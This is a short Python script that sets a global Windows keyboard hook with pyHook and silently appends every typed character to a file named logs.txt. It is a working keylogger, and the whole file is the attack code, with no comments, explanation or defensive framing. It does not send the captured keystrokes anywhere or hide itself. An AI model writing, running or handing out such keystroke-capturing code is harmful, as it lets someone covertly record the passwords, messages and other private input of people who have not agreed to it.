import pyHook
import pythoncom
def OnKeyboardEvent(event):
    with open('logs.txt', 'a') as f:
        if event.Ascii:
            f.write(chr(event.Ascii))
    return True
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()